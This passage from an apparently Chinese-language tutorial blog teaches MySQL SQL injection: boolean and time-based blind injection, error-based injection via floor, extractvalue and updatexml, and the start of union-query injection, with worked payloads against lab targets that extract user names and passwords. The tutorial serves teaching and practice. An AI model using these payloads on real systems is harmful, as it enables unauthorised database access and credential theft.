<span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span># 存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),1,1))&gt;117# 不存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span># 不存在</span><br></pre></td></tr></table></figure>

<p>第四列列名第一个字母为<code>u</code>，有点接近我们的目标了，下面直接猜<code>s</code>，<code>e</code>，<code>r</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),2,1))=115# 存在</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span># 存在</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),4,1))=114# 存在</span></span><br></pre></td></tr></table></figure>

<p>可见我们的推理成功，第四列列名为<code>user</code><br>同理可得第五列列名为<code>password</code></p>
<h3 id="8-爆出数据"><a href="#8-爆出数据" class="headerlink" title="8.爆出数据"></a>8.爆出数据</h3><p>判断出<code>user</code>第一个字段长度为<code>5</code>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select length(user) from users where user_id=1)=5#</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">判断出第一个用户:</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#    a</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 0,1),2,1))=100#    d</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span>#    m</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 0,1),4,1))=105#    i</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">110</span>#    n</span><br></pre></td></tr></table></figure>

<p>第二个用户</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 1,1),1,1))=103#    g</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">111</span>#    o</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 1,1),3,1))=114#    r</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span>#    d</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 1,1),5,1))=111#    o</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">110</span>#    n</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from users limit 1,1),7,1))=98#    b</span></span><br></pre></td></tr></table></figure>

<h2 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于要使用到基于时间的盲注，但是我觉得基于时间的盲注其实就是基于布尔的盲注的升级版，所以我想顺便把基于布尔的盲注分析总结了；</p>
<p>首先我觉得基于时间的盲注和基于布尔的盲注的最直观的差别就是“参照物”不同，也就是说基于布尔的盲注，其实是可以通过页面的一些变化来进行判断结果！但是有的时候，执行一些sql语句的测试，页面不会有像布尔盲注的时候比较直观的变化，所以这个时候所谓的基于时间的盲注，也就是在基于布尔的盲注上结合if判断和sleep（）函数来得到一个时间上的变换延迟的参照，也就可以让我们进行一些判断。</p>
<h3 id="获取数据库名的长度"><a href="#获取数据库名的长度" class="headerlink" title="获取数据库名的长度"></a>获取数据库名的长度</h3><p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> （length(database())）<span class="operator">&gt;</span> <span class="number">5</span>#</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：因为<code>and</code>后面的表达式运算的结果是<code>bool</code>，保证<code>and</code>前面的结果为真的前提下，就可以通过后面的表达式返回的<code>bool</code>结果来判断猜测是否正确<code>database()</code>这个函数的作用是获取当前的数据库名，但是我们并不能看到，所以需要通过<code>length（）</code>函数去获取这个数据库名字的长度，通过这个长度去和我们指定的一个数比较，那么只要最后的结果为真，那就可以得到数据库名字的长度</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>得到数据库名的长度过后，那就可以继续去得到数据库的具体名字，同样也是通过<code>bool</code>结果去判断</p>
<p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>‘ <span class="keyword">and</span> (ascii(substr(database(),n,<span class="number">1</span>)))<span class="operator">&gt;</span>m #</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：得到了数据库名字的具体长度，<code>database（）</code>可以获得数据库的名字（只是无法看到），那就可以通过<code>database（）</code>函数获得数据库名字过后，再通过<code>substr（）</code> 第一个参数是数据库名字，第二个参数是开始截取的字符的位置（从1开始计算），最后一个参数是截取的字符的长度。由于是想要通过<code>bool</code>去判断这个截取出来的具体字符是什么，所以还需要将截取出来的字符使用<code>ascii（）</code>函数将字符转换为ascii编码的数值，然后再通过这个数据去和一个数比较，通过分别改变截取的起始位置和后面对比的数字，最后就可以把具体的数据库名字猜解出来</p>
<h3 id="获取表的数量"><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h3><p>得到数据库表明过后，接下来就可以去获取我们查找到的数据库的表的数量</p>
<p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from information_schema.tables where table_schem=database())&gt;5#</span></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：同样也是通过最后的bool结果的真假来得到表明的数量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schem<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>

<p>这条sql语句的作用就是从数据库<code>information_tables</code>里面的<code>tables</code>表找到<code>table_schem</code>字段为<code>database（）</code>的记录的总数，也就是可以通过这个语句得到<code>database（）</code>这个数据库里面的表的总数，因为<code>information_schema</code>这个数据库里面存放了所有mysql数据库服务器的相关信息，这个数据库里面的<code>tables</code>表里面就是存放的数据库管理系统中所有数据库的表的信息。最后得到表的数量过后，就使用这个数量结果去和一个数进行比较，那么通过对这个比较的数进行改变，就可以猜解出来这个数据库的表的数量是多少；可以通过二分法的方式进行查找</p>
<h3 id="获取表名的长度"><a href="#获取表名的长度" class="headerlink" title="获取表名的长度"></a>获取表名的长度</h3><p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">5</span>#</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：由于一个数据库 里面创建了许多张表，所以我们需要利用<code>limit 0，1</code>这个命令相结合，每次只取一个表去做计算，对于其他的表以此类推；</p>
<h3 id="获取表名字"><a href="#获取表名字" class="headerlink" title="获取表名字"></a>获取表名字</h3><p>得到表名的长度过后，，就需要利用<code>asscii（）</code>函数去得到表名的每一个字符的ascii嘛，从而得到我们想要的表名<br><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>‘ <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：从<code>information_schema</code>的<code>tables</code>表中的<code>table_schema</code>字段等于<code>database()</code>的所有记录中取出第一行记录的 <code>table_name</code>字段的值；<br>然后利用取出的这个值使用<code>substr（）</code>函数分别得到表名的每个字符，然后再通过<code>ascii（）</code>去计算这个ascii码，由于我们看不见这个ascii码是多少，由于我们能够知道布尔结果，所以就用这个计算出的ascii码去和一个数进行比较，从而可以判断出具体的ascii码是多少，也就知道了对应的字符是什么。从而猜解出数据库的表名</p>
<h3 id="获取列名个数，列名长度，列名"><a href="#获取列名个数，列名长度，列名" class="headerlink" title="获取列名个数，列名长度，列名"></a>获取列名个数，列名长度，列名</h3><p>得到数据库的表名过后，那下一步我们就想获得对应表名的列名，也就是字段名字，那么这个时候我们就需要到<code>information_schema</code>数据库里的<code>columns</code>表里面去查询所有的表的列名相关的信息，那么获取列名的步骤也和前面的原理一样，先猜解列名的个数，获取列名的长度，然后通过获得的长度再去猜解列名</p>
<p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> （<span class="keyword">select</span> count（<span class="operator">*</span>）<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘<span class="keyword">user</span>’）<span class="operator">&gt;</span><span class="number">5</span>#</span><br></pre></td></tr></table></figure>

<p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> （<span class="keyword">select</span> length（column_name）<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘<span class="keyword">user</span>’ limit <span class="number">0</span>,<span class="number">1</span>）<span class="operator">&gt;</span><span class="number">5</span>#</span><br></pre></td></tr></table></figure>

<p><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> (ascii（substr（(seclect columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>））)<span class="operator">&gt;</span><span class="number">100</span>#</span><br></pre></td></tr></table></figure>

<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>获取数据，原理同前面一样<br><strong>构造的sql语句</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>‘ <span class="keyword">and</span> (ascii(substr(( <span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">68</span>#</span><br></pre></td></tr></table></figure>

<h3 id="基于时间盲注的要点"><a href="#基于时间盲注的要点" class="headerlink" title="基于时间盲注的要点"></a>基于时间盲注的要点</h3><p>通过对上面的分析，我认为使用基于时间的盲注的时候，就可以将上面的构造的sql语句进行这样的变化，如下：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="name">length</span>(<span class="name">database</span>())&gt;5),sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>其实也就是通过<code>length(database())&gt;5</code> 返回的布尔值，然后造成时间上的延迟来判断结果，如果数据名的长度<code>大于5</code>是成立的，那么<code>sleep（5）</code>这个函数就会起作用，能够让我们感觉到返回一个页面的时间上发生了变化，通过这个变化我们就能知道我们的判断对不对。</p>
<h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><p>可以看一下这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a><br>以下介绍其中三种报错注入方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#报错注入<span class="built_in">floor</span></span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((payload[]),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">#报错注入extractvalue</span><br><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,([payload])))</span><br><span class="line">#报错注入updatexml</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,([payload])),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>floot是区镇函数，返回<code>小于或等于 x </code>的最大整数</p>
<p>上面floor报错例子中floor中传入的是一个rand函数（返回 0 到 1 的随机数）。</p>
<p>floor报错注入主要利用的<code>group by</code>的机制，下面先来了解一下<strong>原理</strong>：</p>
<blockquote>
<p><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的<code>key</code>时，如果<code>key</code>存在于临时表中，则不在临时表中更新临时表中的数据；如果该<code>key</code>不存在于临时表中，则在临时表中插入<code>key</code>所在行的数据。<code>group by floor(random(0)2)</code>出错的原因是key是个随机数，检测临时表中<code>key</code>是否存在时计算了一下<code>floor(random(0)2)</code>可能为0，如果此时临时表只有key为1的行不存在<code>key</code>为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 <code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>
</blockquote>
<p>主要检测时和插入时两次计算的所以输不一致就会报错。</p>
<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ExtractValue</span>(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure>

<p><code>ExtractValue()</code>接受两个字符串参数，一个XML标记片段 <code>xml_frag</code>和一个<code>XPath</code>表达式 <code>xpath_expr</code>（也称为 定位器）; 它返回CDATA第一个文本节点的<code>text（）</code>，该节点是<code>XPath</code>表达式匹配的元素的子元素。</p>
<p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
<p>例如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ExtractValue(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>/&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;/a/b&#x27;);</span><br></pre></td></tr></table></figure>

<p>就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。<br><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200917231129.png" alt="img"><br>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。<br><img src="E:\01TYSEC_BLOG\Hexo\source\img\【SQL注入】SQL注入这一篇就够了\20200917231142.png" alt="img"></p>
<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UpdateXML</span>(xml_target, xpath_expr, new_xml)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>xml_target</code>： 需要操作的xml片段</li>
<li><code>xpath_expr</code>： 需要更新的xml路径(Xpath格式)</li>
<li><code>new_xml</code>： 更新后的内容</li>
</ul>
<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <code>xml_target</code> 新的XML片段 <code>new_xml</code> ，然后返回更改的XML。<code>xml_target</code>替换的部分 与<code>xpath_expr</code> 用户提供的<code>XPath</code>表达式匹配。</p>
<p>如果未<code>xpath_expr</code>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <code>xml_targetXML</code>片段。所有三个参数都应该是字符串。使用方式如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT</span><br><span class="line">    -&gt;   UpdateXML(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;/a&#x27;, &#x27;<span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span>&#x27;) AS val1,</span><br><span class="line">    -&gt;   UpdateXML(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;/b&#x27;, &#x27;<span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span>&#x27;) AS val2,</span><br><span class="line">    -&gt;   UpdateXML(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;//b&#x27;, &#x27;<span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span>&#x27;) AS val3,</span><br><span class="line">    -&gt;   UpdateXML(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;/a/d&#x27;, &#x27;<span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span>&#x27;) AS val4,</span><br><span class="line">    -&gt;   UpdateXML(&#x27;<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;, &#x27;/a/d&#x27;, &#x27;<span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span>&#x27;) AS val5</span><br><span class="line">    -&gt; \G</span><br><span class="line">***********结果**************</span><br><span class="line">val1: <span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">val2: <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">val3: <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">val4: <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">e</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">e</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">val5: <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里和上面的<code>extractvalue</code>函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hirak0/hirak0-images/blog/sql/20200917231331.png" alt="img"></p>
<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>1、尝试用单引号报错</p>
<p>2、获取数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p>–0x7e是”~”符号的16进制，在这作为分隔符<br>3、获取表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>数据库名<span class="string">&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p>4、获取字段名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;</span>数据库名<span class="string">&#x27; and table_name=&#x27;</span>表名<span class="string">&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p>5、取数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>

<p>其他函数payload语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--extractvalue</span></span><br><span class="line"><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--floor()</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起，使用为此为UNINO或UNION ALL<br>联合查询：将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并</p>
<p><strong>基本语法</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 语句</span><br><span class="line"><span class="keyword">union</span>[<span class="keyword">union</span>选项]</span><br><span class="line"><span class="keyword">select</span> 语句；</span><br></pre></td></tr></table></figure>

<h3 id="联合查询注入的条件"><a href="#联合查询注入的条件" class="headerlink" title="联合查询注入的条件"></a>联合查询注入的条件</h3><p>联合查询注入是MySQL注入中的一种方式，在SQL注入中说了注入漏洞存在的相关条件，而联合查询注入这种方法需要满足查询的信息在前端有回显，回显数据的位置就叫回显位。<br>如果有注入漏洞的页面存在这种回显位就可以利用联合查询注入的方式进行注入。</p>
<h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>这里通过sqli-labs第一关来学习联合查询注入的方式</p>
